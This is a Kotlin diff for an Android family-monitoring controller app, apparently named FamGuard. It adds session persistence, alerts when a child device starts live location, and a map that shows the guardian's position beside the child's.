@@ -29,7 +29,29 @@ import com.famguard.controller.devices.QrCodeGenerator
 import com.famguard.controller.webrtc.ControllerWebRtcManager
 import com.google.android.gms.maps.model.CameraPosition
 import com.google.android.gms.maps.model.LatLng
+import com.google.android.gms.maps.model.LatLngBounds
+import com.google.android.gms.maps.model.BitmapDescriptorFactory
+import com.google.android.gms.maps.model.Dash
+import com.google.android.gms.maps.model.Gap
+import com.google.android.gms.maps.model.PatternItem
+import com.google.android.gms.maps.CameraUpdateFactory
+import com.google.android.gms.location.LocationServices
+import com.google.android.gms.location.Priority
 import com.google.maps.android.compose.*
+import android.Manifest
+import android.content.Context
+import android.content.pm.PackageManager
+import android.location.Location
+import android.app.NotificationChannel
+import android.app.NotificationManager
+import android.app.PendingIntent
+import android.os.Build
+import androidx.core.app.NotificationCompat
+import androidx.core.content.ContextCompat
+import androidx.activity.compose.rememberLauncherForActivityResult
+import androidx.activity.result.contract.ActivityResultContracts
+import androidx.compose.animation.*
+import androidx.compose.ui.draw.shadow
 import android.content.Intent
 import android.net.Uri
 import androidx.compose.ui.platform.LocalContext
@@ -65,12 +87,14 @@ enum class ControllerScreenTab {
 @Composable
 fun ControllerMainScreen(
     apiClient: ControllerApiClient,
-    configStore: ControllerConfigStore? = null
+    configStore: ControllerConfigStore? = null,
+    targetTab: String? = null,
+    targetDeviceId: String? = null
 ) {
     val context = LocalContext.current
     val currentConfigStore = configStore ?: remember { ControllerConfigStore(context) }
     val coroutineScope = rememberCoroutineScope()
-    var isAuthenticated by remember { mutableStateOf(apiClient.currentUser != null) }
+    var isAuthenticated by remember { mutableStateOf(apiClient.currentUser != null || currentConfigStore.hasSession()) }
 
     // Settings dialog state
     var showSettingsDialog by remember { mutableStateOf(false) }
@@ -90,7 +114,24 @@ fun ControllerMainScreen(
     var isDevicesLoading by remember { mutableStateOf(false) }
 
     // Navigation tab
-    var currentTab by remember { mutableStateOf(ControllerScreenTab.DASHBOARD) }
+    var currentTab by remember { mutableStateOf(if (targetTab == "MAP") ControllerScreenTab.MAP else ControllerScreenTab.DASHBOARD) }
+
+    // Live location alert banner state
+    var liveLocationAlertBanner by remember { mutableStateOf<String?>(null) }
+    var liveLocationAlertDeviceId by remember { mutableStateOf<String?>(null) }
+
+    // Android 13+ Notification permission request
+    val notifPermissionLauncher = rememberLauncherForActivityResult(
+        ActivityResultContracts.RequestPermission()
+    ) { /* Permission callback */ }
+
+    LaunchedEffect(isAuthenticated) {
+        if (isAuthenticated && Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+            if (ContextCompat.checkSelfPermission(context, Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED) {
+                notifPermissionLauncher.launch(Manifest.permission.POST_NOTIFICATIONS)
+            }
+        }
+    }
 
     // QR Pairing Dialog
     var showAddDeviceDialog by remember { mutableStateOf(false) }
@@ -104,6 +145,19 @@ fun ControllerMainScreen(
     var activeLocationSession by remember { mutableStateOf<LocationSession?>(null) }
     var latestLocation by remember { mutableStateOf<LocationUpdate?>(null) }
     var locationStatusMessage by remember { mutableStateOf<String?>(null) }
+
+    // Handle deep navigation from system notification
+    LaunchedEffect(targetTab, targetDeviceId, devicesList.size) {
+        if (targetTab == "MAP") {
+            currentTab = ControllerScreenTab.MAP
+            if (targetDeviceId != null) {
+                val matched = devicesList.find { it.id == targetDeviceId }
+                if (matched != null) {
+                    selectedDevice = matched
+                }
+            }
+        }
+    }
 
     // App activity state
     var activityJsonString by remember { mutableStateOf<String?>(null) }
@@ -120,7 +174,9 @@ fun ControllerMainScreen(
                 onSuccess = { list ->
                     devicesList.clear()
                     devicesList.addAll(list)
-                    if (selectedDevice == null || !list.any { it.id == selectedDevice?.id }) {
+                    if (targetDeviceId != null) {
+                        selectedDevice = list.find { it.id == targetDeviceId } ?: list.firstOrNull()
+                    } else if (selectedDevice == null || !list.any { it.id == selectedDevice?.id }) {
                         selectedDevice = list.firstOrNull()
                     }
                 },
@@ -133,6 +189,43 @@ fun ControllerMainScreen(
     LaunchedEffect(isAuthenticated) {
         if (isAuthenticated) {
             refreshDevices()
+        }
+    }
+
+    // Live location stream signal watcher: notifies controller when child starts live location
+    LaunchedEffect(isAuthenticated, devicesList.size) {
+        if (isAuthenticated && devicesList.isNotEmpty()) {
+            while (isActive) {
+                try {
+                    for (dev in devicesList) {
+                        val signals = apiClient.fetchIncomingSignals(dev.id, "location")
+                        for (sigJson in signals) {
+                            val obj = JSONObject(sigJson)
+                            val type = obj.optString("type")
+                            val timestamp = obj.optLong("timestamp", 0L)
+                            val isRecent = timestamp == 0L || (System.currentTimeMillis() - timestamp) < 120_000L
+
+                            if (type == "live_location_started" && isRecent) {
+                                liveLocationAlertDeviceId = dev.id
+                                liveLocationAlertBanner = "${dev.name} started live location streaming!"
+                                showSystemLiveLocationNotification(context, dev.name, dev.id)
+                                if (selectedDevice?.id == dev.id && currentTab == ControllerScreenTab.MAP) {
+                                    val res = apiClient.fetchLatestLocation(dev.id)
+                                    res.onSuccess { loc -> if (loc != null) latestLocation = loc }
+                                }
+                            } else if (type == "live_location_stopped") {
+                                if (liveLocationAlertDeviceId == dev.id) {
+                                    liveLocationAlertBanner = null
+                                    liveLocationAlertDeviceId = null
+                                }
+                            }
+                        }
+                    }
+                } catch (e: Exception) {
+                    android.util.Log.d("LocationWatcher", "Error checking signals: ${e.message}")
+                }
+                delay(3500)
+            }
         }
     }
 
@@ -183,6 +276,41 @@ fun ControllerMainScreen(
     var appLaunchUpdateError by remember { mutableStateOf<String?>(null) }
 
     LaunchedEffect(Unit) {
+        // Restore and validate session
+        val savedSession = currentConfigStore.getSession()
+        if (savedSession != null) {
+            if (apiClient.currentUser == null) {
+                apiClient.currentUser = com.famguard.controller.auth.AuthUser(
+                    id = savedSession.userId,
+                    email = savedSession.email,
+                    accessToken = savedSession.accessToken,
+                    refreshToken = savedSession.refreshToken
+                )
+                isAuthenticated = true
+            }
+            if (savedSession.refreshToken.isNotBlank()) {
+                val refreshRes = apiClient.refreshSession(savedSession.refreshToken)
+                refreshRes.fold(
+                    onSuccess = { refreshed ->
+                        currentConfigStore.saveSession(
+                            userId = refreshed.id,
+                            email = refreshed.email,
+                            accessToken = refreshed.accessToken,
+                            refreshToken = refreshed.refreshToken
+                        )
+                    },
+                    onFailure = { err ->
+                        val msg = err.message ?: ""
+                        if (msg.contains("invalid_grant") || msg.contains("Revoked")) {
+                            currentConfigStore.clearSession()
+                            apiClient.currentUser = null
+                            isAuthenticated = false
+                        }
+                    }
+                )
+            }
+        }
+
         try {
             val res = UpdateManager.checkForUpdates()
             res.onSuccess { info ->
@@ -369,6 +497,31 @@ fun ControllerMainScreen(
                             color = MaterialTheme.colorScheme.onSurfaceVariant
                         )
 
+                        if (!currentConfigStore.isConfigured()) {
+                            Surface(
+                                color = MaterialTheme.colorScheme.errorContainer,
+                                shape = RoundedCornerShape(8.dp),
+                                modifier = Modifier.fillMaxWidth()
+                            ) {
+                                Row(
+                                    modifier = Modifier.padding(12.dp),
+                                    verticalAlignment = Alignment.CenterVertically
+                                ) {
+                                    Icon(
+                                        Icons.Default.Warning,
+                                        contentDescription = null,
+                                        tint = MaterialTheme.colorScheme.error
+                                    )
+                                    Spacer(modifier = Modifier.width(8.dp))
+                                    Text(
+                                        "Backend not configured! Please tap 'Configure Server & Updates' below to set your Supabase URL & Key.",
+                                        fontSize = 12.sp,
+                                        color = MaterialTheme.colorScheme.onErrorContainer
+                                    )
+                                }
+                            }
+                        }
+
                         OutlinedTextField(
                             value = emailInput,
                             onValueChange = { emailInput = it },
@@ -395,12 +548,23 @@ fun ControllerMainScreen(
 
                         Button(
                             onClick = {
+                                if (!currentConfigStore.isConfigured() || apiClient.getSupabaseUrl().isBlank()) {
+                                    authError = "Please tap 'Configure Server & Updates' below to set your Supabase URL first."
+                                    showSettingsDialog = true
+                                    return@Button
+                                }
                                 isAuthLoading = true
                                 authError = null
                                 coroutineScope.launch {
                                     val res = apiClient.signIn(emailInput, passwordInput)
                                     res.fold(
-                                        onSuccess = {
+                                        onSuccess = { authUser ->
+                                            currentConfigStore.saveSession(
+                                                userId = authUser.id,
+                                                email = authUser.email,
+                                                accessToken = authUser.accessToken,
+                                                refreshToken = authUser.refreshToken
+                                            )
                                             isAuthenticated = true
                                         },
                                         onFailure = { err ->
@@ -472,6 +636,7 @@ fun ControllerMainScreen(
                             Icon(Icons.Default.Settings, contentDescription = "Settings & Updates")
                         }
                         IconButton(onClick = {
+                            currentConfigStore.clearSession()
                             apiClient.currentUser = null
                             isAuthenticated = false
                         }) {
@@ -522,12 +687,95 @@ fun ControllerMainScreen(
                 }
             }
         ) { padding ->
-            Box(
+            Column(
                 modifier = Modifier
                     .fillMaxSize()
                     .padding(padding)
             ) {
-                when (currentTab) {
+                // Live Location Started Notification Banner
+                AnimatedVisibility(
+                    visible = liveLocationAlertBanner != null,
+                    enter = expandVertically() + fadeIn(),
+                    exit = shrinkVertically() + fadeOut()
+                ) {
+                    Surface(
+                        color = Color(0xFF065F46),
+                        shape = RoundedCornerShape(0.dp),
+                        modifier = Modifier
+                            .fillMaxWidth()
+                            .shadow(4.dp)
+                    ) {
+                        Row(
+                            modifier = Modifier
+                                .fillMaxWidth()
+                                .padding(horizontal = 14.dp, vertical = 8.dp),
+                            verticalAlignment = Alignment.CenterVertically,
+                            horizontalArrangement = Arrangement.SpaceBetween
+                        ) {
+                            Row(
+                                verticalAlignment = Alignment.CenterVertically,
+                                modifier = Modifier.weight(1f)
+                            ) {
+                                Box(
+                                    modifier = Modifier
+                                        .size(10.dp)
+                                        .clip(CircleShape)
+                                        .background(Color(0xFF34D399))
+                                )
+                                Spacer(modifier = Modifier.width(8.dp))
+                                Column {
+                                    Text(
+                                        text = "📍 Live Location Started",
+                                        fontWeight = FontWeight.Bold,
+                                        fontSize = 12.sp,
+                                        color = Color(0xFF6EE7B7)
+                                    )
+                                    Text(
+                                        text = liveLocationAlertBanner ?: "",
+                                        fontSize = 12.sp,
+                                        color = Color.White
+                                    )
+                                }
+                            }
+                            Row(
+                                verticalAlignment = Alignment.CenterVertically,
+                                horizontalArrangement = Arrangement.spacedBy(6.dp)
+                            ) {
+                                Button(
+                                    onClick = {
+                                        val targetDev = devicesList.find { it.id == liveLocationAlertDeviceId }
+                                        if (targetDev != null) selectedDevice = targetDev
+                                        currentTab = ControllerScreenTab.MAP
+                                        liveLocationAlertBanner = null
+                                    },
+                                    colors = ButtonDefaults.buttonColors(
+                                        containerColor = Color(0xFF10B981),
+                                        contentColor = Color.Black
+                                    ),
+                                    contentPadding = PaddingValues(horizontal = 10.dp, vertical = 4.dp),
+                                    modifier = Modifier.height(30.dp)
+                                ) {
+                                    Icon(Icons.Default.Map, contentDescription = null, modifier = Modifier.size(14.dp))
+                                    Spacer(modifier = Modifier.width(4.dp))
+                                    Text("View Map", fontWeight = FontWeight.Bold, fontSize = 11.sp)
+                                }
+                                IconButton(
+                                    onClick = { liveLocationAlertBanner = null },
+                                    modifier = Modifier.size(28.dp)
+                                ) {
+                                    Icon(Icons.Default.Close, contentDescription = "Dismiss", tint = Color.White.copy(alpha = 0.8f), modifier = Modifier.size(16.dp))
+                                }
+                            }
+                        }
+                    }
+                }
+
+                Box(
+                    modifier = Modifier
+                        .weight(1f)
+                        .fillMaxWidth()
+                ) {
+                    when (currentTab) {
                     ControllerScreenTab.DASHBOARD -> {
                         DevicesDashboardScreen(
                             devices = devicesList,
@@ -712,6 +960,7 @@ fun ControllerMainScreen(
             }
         }
     }
+}
 
     // Add Device QR Dialog
     if (showAddDeviceDialog) {
@@ -1275,6 +1524,51 @@ fun AppDrawerScreen(
     }
 }
 
+fun showSystemLiveLocationNotification(context: Context, deviceName: String, deviceId: String) {
+    try {
+        val channelId = "famguard_location_alerts"
+        val notificationManager = context.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
+
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            val channel = NotificationChannel(
+                channelId,
+                "Live Location Alerts",
+                NotificationManager.IMPORTANCE_HIGH
+            ).apply {
+                description = "Alerts when a family device starts broadcasting real-time GPS"
+                enableVibration(true)
+            }
+            notificationManager.createNotificationChannel(channel)
+        }
+
+        val intent = Intent(context, com.famguard.controller.MainActivity::class.java).apply {
+            flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP
+            putExtra("extra_tab", "MAP")
+            putExtra("extra_device_id", deviceId)
+        }
+
+        val pendingIntent = PendingIntent.getActivity(
+            context,
+            deviceId.hashCode(),
+            intent,
+            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
+        )
+
+        val notification = NotificationCompat.Builder(context, channelId)
+            .setSmallIcon(android.R.drawable.ic_menu_mylocation)
+            .setContentTitle("📍 Live Location Started")
+            .setContentText("$deviceName started live location stream.")
+            .setPriority(NotificationCompat.PRIORITY_HIGH)
+            .setAutoCancel(true)
+            .setContentIntent(pendingIntent)
+            .build()
+
+        notificationManager.notify(deviceId.hashCode(), notification)
+    } catch (e: Exception) {
+        android.util.Log.w("LocationAlert", "Could not show notification: ${e.message}")
+    }
+}
+
 @Composable
 fun GoogleMapsLocationScreen(
     device: Device?,
@@ -1286,6 +1580,45 @@ fun GoogleMapsLocationScreen(
     statusMessage: String?
 ) {
     val context = LocalContext.current
+    val coroutineScope = rememberCoroutineScope()
+
+    // Controller's own location state
+    var hasLocationPermission by remember {
+        mutableStateOf(
+            ContextCompat.checkSelfPermission(context, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED ||
+            ContextCompat.checkSelfPermission(context, Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED
+        )
+    }
+
+    val locationPermissionLauncher = rememberLauncherForActivityResult(
+        ActivityResultContracts.RequestMultiplePermissions()
+    ) { perms ->
+        hasLocationPermission = perms[Manifest.permission.ACCESS_FINE_LOCATION] == true ||
+                perms[Manifest.permission.ACCESS_COARSE_LOCATION] == true
+    }
+
+    var controllerLocation by remember { mutableStateOf<Location?>(null) }
+    val fusedClient = remember { LocationServices.getFusedLocationProviderClient(context) }
+
+    // Periodically fetch Controller's location while viewing Map
+    LaunchedEffect(hasLocationPermission) {
+        if (hasLocationPermission) {
+            try {
+                fusedClient.lastLocation.addOnSuccessListener { loc ->
+                    if (loc != null) controllerLocation = loc
+                }
+                while (isActive) {
+                    fusedClient.getCurrentLocation(Priority.PRIORITY_HIGH_ACCURACY, null)
+                        .addOnSuccessListener { loc ->
+                            if (loc != null) controllerLocation = loc
+                        }
+                    delay(4000)
+                }
+            } catch (e: SecurityException) {
+                android.util.Log.w("ControllerMap", "Location permission missing: ${e.message}")
+            }
+        }
+    }
 
     LaunchedEffect(device?.id) {
         onFetchLatest()
@@ -1301,19 +1634,47 @@ fun GoogleMapsLocationScreen(
         }
     }
 
+    // Distance calculation between Child and Controller
+    val distanceText = remember(location?.latitude, location?.longitude, controllerLocation?.latitude, controllerLocation?.longitude) {
+        if (location != null && controllerLocation != null) {
+            val res = FloatArray(1)
+            Location.distanceBetween(
+                location.latitude, location.longitude,
+                controllerLocation!!.latitude, controllerLocation!!.longitude,
+                res
+            )
+            val d = res[0]
+            if (d < 1000f) {
+                "${d.toInt()} m"
+            } else {
+                "${String.format("%.1f", d / 1000f)} km"
+            }
+        } else null
+    }
+
     val lat = location?.latitude ?: 37.7749
     val lon = location?.longitude ?: -122.4194
     val cameraPositionState = rememberCameraPositionState {
         position = CameraPosition.fromLatLngZoom(LatLng(lat, lon), 15f)
     }
 
-    LaunchedEffect(location?.latitude, location?.longitude) {
-        if (location != null) {
+    LaunchedEffect(location?.latitude, location?.longitude, controllerLocation?.latitude, controllerLocation?.longitude) {
+        if (location != null && controllerLocation != null) {
+            try {
+                val bounds = LatLngBounds.builder()
+                    .include(LatLng(location.latitude, location.longitude))
+                    .include(LatLng(controllerLocation!!.latitude, controllerLocation!!.longitude))
+                    .build()
+                cameraPositionState.animate(CameraUpdateFactory.newLatLngBounds(bounds, 150))
+            } catch (_: Exception) {
+                cameraPositionState.position = CameraPosition.fromLatLngZoom(LatLng(location.latitude, location.longitude), 15f)
+            }
+        } else if (location != null) {
             cameraPositionState.position = CameraPosition.fromLatLngZoom(LatLng(location.latitude, location.longitude), 16f)
         }
     }
 
-    var useOsmMap by remember { mutableStateOf(true) }
+    var useOsmMap by remember { mutableStateOf(false) }
 
     Column(modifier = Modifier.fillMaxSize()) {
         Surface(
@@ -1336,7 +1697,7 @@ fun GoogleMapsLocationScreen(
                             )
                             Spacer(modifier = Modifier.width(6.dp))
                             Text(
-                                text = if (isSessionActive) "LIVE LOCATION STREAMING (Always Active)" else "STANDBY (Tap 'Start Live' to stream)",
+                                text = if (isSessionActive) "LIVE LOCATION STREAMING (Active)" else "STANDBY (Ready to stream)",
                                 fontWeight = FontWeight.Bold,
                                 fontSize = 12.sp,
                                 color = if (isSessionActive) Color(0xFF10B981) else MaterialTheme.colorScheme.onSurfaceVariant
@@ -1380,42 +1741,69 @@ fun GoogleMapsLocationScreen(
             }
         }
 
-        // Live Telemetry Bar with One-Click Open in Google Maps
-        if (location != null) {
-            Surface(
-                color = MaterialTheme.colorScheme.primaryContainer,
-                modifier = Modifier.fillMaxWidth()
+        // Dual Telemetry & Distance Banner (Child + Guardian)
+        Surface(
+            color = MaterialTheme.colorScheme.primaryContainer,
+            modifier = Modifier.fillMaxWidth()
+        ) {
+            Row(
+                modifier = Modifier
+                    .fillMaxWidth()
+                    .padding(horizontal = 14.dp, vertical = 8.dp),
+                horizontalArrangement = Arrangement.SpaceBetween,
+                verticalAlignment = Alignment.CenterVertically
             ) {
-                Row(
-                    modifier = Modifier
-                        .fillMaxWidth()
-                        .padding(horizontal = 16.dp, vertical = 8.dp),
-                    horizontalArrangement = Arrangement.SpaceBetween,
-                    verticalAlignment = Alignment.CenterVertically
-                ) {
-                    Column {
+                Column(modifier = Modifier.weight(1f)) {
+                    Row(verticalAlignment = Alignment.CenterVertically) {
                         Text(
-                            "${String.format("%.5f", location.latitude)}, ${String.format("%.5f", location.longitude)}",
+                            text = if (distanceText != null) "📍 Distance to ${device?.name ?: "Child"}: $distanceText" else "📍 Tracking ${device?.name ?: "Child"}",
                             fontWeight = FontWeight.Bold,
-                            fontSize = 13.sp
-                        )
-                        Text(
-                            "Accuracy ±${location.accuracyM.toInt()}m • ${location.recordedAt.takeLast(9)}",
-                            fontSize = 11.sp,
-                            color = MaterialTheme.colorScheme.onSurfaceVariant
+                            fontSize = 13.sp,
+                            color = MaterialTheme.colorScheme.onPrimaryContainer
                         )
                     }
-                    FilledTonalButton(
-                        onClick = {
-                            val uri = Uri.parse("geo:${location.latitude},${location.longitude}?q=${location.latitude},${location.longitude}(${device?.name ?: "Family Device"})")
-                            val mapIntent = Intent(Intent.ACTION_VIEW, uri)
-                            context.startActivity(mapIntent)
-                        },
-                        contentPadding = PaddingValues(horizontal = 12.dp, vertical = 4.dp)
-                    ) {
-                        Icon(Icons.Default.OpenInNew, contentDescription = null, modifier = Modifier.size(14.dp))
-                        Spacer(modifier = Modifier.width(4.dp))
-                        Text("Open Map App", fontSize = 12.sp)
+                    Text(
+                        text = if (controllerLocation != null && location != null)
+                            "Child: ±${location.accuracyM.toInt()}m • You: ±${controllerLocation!!.accuracy.toInt()}m"
+                        else if (!hasLocationPermission)
+                            "Tap 'My Location' to show yourself on the map"
+                        else
+                            "Locating guardian position...",
+                        fontSize = 11.sp,
+                        color = MaterialTheme.colorScheme.onSurfaceVariant
+                    )
+                }
+
+                Row(horizontalArrangement = Arrangement.spacedBy(6.dp), verticalAlignment = Alignment.CenterVertically) {
+                    if (!hasLocationPermission) {
+                        FilledTonalButton(
+                            onClick = {
+                                locationPermissionLauncher.launch(
+                                    arrayOf(
+                                        Manifest.permission.ACCESS_FINE_LOCATION,
+                                        Manifest.permission.ACCESS_COARSE_LOCATION
+                                    )
+                                )
+                            },
+                            contentPadding = PaddingValues(horizontal = 10.dp, vertical = 4.dp)
+                        ) {
+                            Icon(Icons.Default.MyLocation, contentDescription = null, modifier = Modifier.size(14.dp))
+                            Spacer(modifier = Modifier.width(4.dp))
+                            Text("My Location", fontSize = 11.sp)
+                        }
+                    } else if (location != null) {
+                        FilledTonalButton(
+                            onClick = {
+                                val uri = Uri.parse("geo:${location.latitude},${location.longitude}?q=${location.latitude},${location.longitude}(${device?.name ?: "Child"})")
+                                val mapIntent = Intent(Intent.ACTION_VIEW, uri)
+                                context.startActivity(mapIntent)
+                            },
+                            contentPadding = PaddingValues(horizontal = 10.dp, vertical = 4.dp)
+                        ) {
+                            Icon(Icons.Default.Directions, contentDescription = null, modifier = Modifier.size(14.dp))
+                            Spacer(modifier = Modifier.width(4.dp))
+                            Text("Directions", fontSize = 11.sp)
+                        }
                     }
                 }
             }
@@ -1448,10 +1836,13 @@ fun GoogleMapsLocationScreen(
         Box(modifier = Modifier.weight(1f)) {
             if (useOsmMap) {
                 LeafletOsmMapView(
-                    latitude = lat,
-                    longitude = lon,
-                    accuracyM = location?.accuracyM ?: 25f,
-                    deviceName = device?.name ?: "Target Device",
+                    childLat = lat,
+                    childLon = lon,
+                    childAccuracyM = location?.accuracyM ?: 25f,
+                    childName = device?.name ?: "Target Child",
+                    controllerLat = controllerLocation?.latitude,
+                    controllerLon = controllerLocation?.longitude,
+                    controllerAccuracyM = controllerLocation?.accuracy,
                     modifier = Modifier.fillMaxSize()
                 )
             } else {
@@ -1460,19 +1851,50 @@ fun GoogleMapsLocationScreen(
                     cameraPositionState = cameraPositionState
                 ) {
                     if (location != null) {
-                        val targetLatLng = LatLng(location.latitude, location.longitude)
+                        val childLatLng = LatLng(location.latitude, location.longitude)
                         Marker(
-                            state = MarkerState(position = targetLatLng),
-                            title = device?.name ?: "Target Device",
-                            snippet = "Accuracy ±${location.accuracyM}m"
+                            state = MarkerState(position = childLatLng),
+                            title = "${device?.name ?: "Target Device"} (Child)",
+                            snippet = "Accuracy ±${location.accuracyM.toInt()}m • Live",
+                            icon = BitmapDescriptorFactory.defaultMarker(BitmapDescriptorFactory.HUE_AZURE)
                         )
                         Circle(
-                            center = targetLatLng,
+                            center = childLatLng,
                             radius = location.accuracyM.toDouble(),
-                            fillColor = Color(0x332196F3),
-                            strokeColor = Color(0xFF2196F3),
+                            fillColor = Color(0x3310B981),
+                            strokeColor = Color(0xFF10B981),
                             strokeWidth = 2f
                         )
+                    }
+
+                    if (controllerLocation != null) {
+                        val parentLatLng = LatLng(controllerLocation!!.latitude, controllerLocation!!.longitude)
+                        Marker(
+                            state = MarkerState(position = parentLatLng),
+                            title = "You (Guardian)",
+                            snippet = "Controller's current GPS position",
+                            icon = BitmapDescriptorFactory.defaultMarker(BitmapDescriptorFactory.HUE_BLUE)
+                        )
+                        Circle(
+                            center = parentLatLng,
+                            radius = controllerLocation!!.accuracy.toDouble().coerceAtLeast(15.0),
+                            fillColor = Color(0x222563EB),
+                            strokeColor = Color(0xFF2563EB),
+                            strokeWidth = 2f
+                        )
+
+                        // Connect child and guardian with dashed polyline
+                        if (location != null) {
+                            Polyline(
+                                points = listOf(
+                                    LatLng(location.latitude, location.longitude),
+                                    parentLatLng
+                                ),
+                                color = Color(0xFF6366F1),
+                                width = 5f,
+                                pattern = listOf(Dash(20f), Gap(10f))
+                            )
+                        }
                     }
                 }
             }
@@ -1482,28 +1904,98 @@ fun GoogleMapsLocationScreen(
 
 @Composable
 fun LeafletOsmMapView(
-    latitude: Double,
-    longitude: Double,
-    accuracyM: Float,
-    deviceName: String,
+    childLat: Double,
+    childLon: Double,
+    childAccuracyM: Float,
+    childName: String,
+    controllerLat: Double? = null,
+    controllerLon: Double? = null,
+    controllerAccuracyM: Float? = null,
     modifier: Modifier = Modifier
 ) {
     var webViewRef by remember { mutableStateOf<WebView?>(null) }
-    val delta = 0.007
-    val mapUrl = "https://www.openstreetmap.org/export/embed.html?bbox=${longitude - delta},${latitude - delta},${longitude + delta},${latitude + delta}&layer=mapnik&marker=$latitude,$longitude"
 
-    var lastLoadedLat by remember { mutableDoubleStateOf(0.0) }
-    var lastLoadedLon by remember { mutableDoubleStateOf(0.0) }
+    fun generateHtml(): String {
+        val hasParent = controllerLat != null && controllerLon != null
+        val safeName = childName.replace("'", "\\'").replace("\"", "\\\"")
+        return """
+            <!DOCTYPE html>
+            <html>
+            <head>
+              <meta charset="utf-8" />
+              <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+              <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+              <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+              <style>
+                html, body, #map { height: 100%; width: 100%; margin: 0; padding: 0; background: #0f172a; }
+                .leaflet-popup-content-wrapper { border-radius: 12px; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
+                .marker-wrap { display: flex; align-items: center; justify-content: center; border-radius: 50%; border: 3px solid white; box-shadow: 0 4px 14px rgba(0,0,0,0.5); font-size: 14px; }
+                .child-bg { background: #10B981; }
+                .parent-bg { background: #2563EB; }
+              </style>
+            </head>
+            <body>
+              <div id="map"></div>
+              <script>
+                var map = L.map('map', { zoomControl: false });
+                L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+                  maxZoom: 19,
+                  attribution: '© OpenStreetMap'
+                }).addTo(map);
 
-    LaunchedEffect(latitude, longitude) {
-        // Reload when location shifts by more than 10 meters
-        val latDiff = Math.abs(latitude - lastLoadedLat)
-        val lonDiff = Math.abs(longitude - lastLoadedLon)
-        if (latDiff > 0.0001 || lonDiff > 0.0001) {
-            lastLoadedLat = latitude
-            lastLoadedLon = longitude
-            webViewRef?.loadUrl(mapUrl)
-        }
+                var bounds = [];
+                // Child Marker (Emerald Halo)
+                var childIcon = L.divIcon({
+                  className: 'child-marker',
+                  html: '<div class="marker-wrap child-bg" style="width:28px;height:28px;">🧒</div>',
+                  iconSize: [28, 28],
+                  iconAnchor: [14, 14]
+                });
+                var childMarker = L.marker([$childLat, $childLon], {icon: childIcon}).addTo(map);
+                childMarker.bindPopup('<b>$safeName (Child)</b><br>Accuracy: ±${childAccuracyM.toInt()}m').openPopup();
+                bounds.push([$childLat, $childLon]);
+
+                L.circle([$childLat, $childLon], {
+                  radius: $childAccuracyM,
+                  color: '#10B981',
+                  fillColor: '#10B981',
+                  fillOpacity: 0.15
+                }).addTo(map);
+
+                ${if (hasParent) """
+                // Guardian Marker (Royal Blue Halo)
+                var parentIcon = L.divIcon({
+                  className: 'parent-marker',
+                  html: '<div class="marker-wrap parent-bg" style="width:28px;height:28px;">🛡️</div>',
+                  iconSize: [28, 28],
+                  iconAnchor: [14, 14]
+                });
+                var parentMarker = L.marker([$controllerLat, $controllerLon], {icon: parentIcon}).addTo(map);
+                parentMarker.bindPopup('<b>You (Guardian)</b>');
+                bounds.push([$controllerLat, $controllerLon]);
+
+                // Route line connecting guardian and child
+                L.polyline([[$childLat, $childLon], [$controllerLat, $controllerLon]], {
+                  color: '#6366F1',
+                  weight: 4,
+                  dashArray: '6, 8',
+                  opacity: 0.85
+                }).addTo(map);
+                """ else ""}
+
+                if (bounds.length > 1) {
+                  map.fitBounds(bounds, { padding: [60, 60], maxZoom: 17 });
+                } else {
+                  map.setView([$childLat, $childLon], 16);
+                }
+              </script>
+            </body>
+            </html>
+        """.trimIndent()
+    }
+
+    LaunchedEffect(childLat, childLon, controllerLat, controllerLon) {
+        webViewRef?.loadDataWithBaseURL("https://famguard.local", generateHtml(), "text/html", "UTF-8", null)
     }
 
     AndroidView(
@@ -1519,27 +2011,7 @@ fun LeafletOsmMapView(
                 settings.useWideViewPort = true
                 settings.mixedContentMode = WebSettings.MIXED_CONTENT_ALWAYS_ALLOW
                 settings.userAgentString = "Mozilla/5.0 (Linux; Android 14; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36 FamGuard/1.0"
-                webChromeClient = object : WebChromeClient() {
-                    override fun onConsoleMessage(consoleMessage: android.webkit.ConsoleMessage?): Boolean {
-                        android.util.Log.d("LeafletMap", "Console: \${consoleMessage?.message()}")
-                        return true
-                    }
-                }
-                webViewClient = object : WebViewClient() {
-                    override fun onPageFinished(view: WebView?, url: String?) {
-                        super.onPageFinished(view, url)
-                        android.util.Log.d("LeafletMap", "Page finished loading: \$url")
-                    }
-                    override fun onReceivedError(view: WebView?, request: android.webkit.WebResourceRequest?, error: android.webkit.WebResourceError?) {
-                        super.onReceivedError(view, request, error)
-                        android.util.Log.e("LeafletMap", "WebResourceError: \${error?.description} code: \${error?.errorCode} url: \${request?.url}")
-                    }
-                    override fun onReceivedHttpError(view: WebView?, request: android.webkit.WebResourceRequest?, errorResponse: android.webkit.WebResourceResponse?) {
-                        super.onReceivedHttpError(view, request, errorResponse)
-                        android.util.Log.e("LeafletMap", "HttpError: \${errorResponse?.statusCode} url: \${request?.url}")
-                    }
-                }
-                loadUrl(mapUrl)
+                loadDataWithBaseURL("https://famguard.local", generateHtml(), "text/html", "UTF-8", null)
                 webViewRef = this
             }
         },
@@ -2262,6 +2734,14 @@ fun LiveScreenMirrorTab(
     var isConnecting by remember { mutableStateOf(false) }
     var rendererRef by remember { mutableStateOf<org.webrtc.SurfaceViewRenderer?>(null) }
 
+    // Option 3 / Option 1 mode control & snapshot state
+    var mirrorMode by remember { mutableStateOf("snapshot") } // "snapshot" (Option 3) or "webrtc_projection" (Option 1)
+    var liveBitmap by remember { mutableStateOf<android.graphics.Bitmap?>(null) }
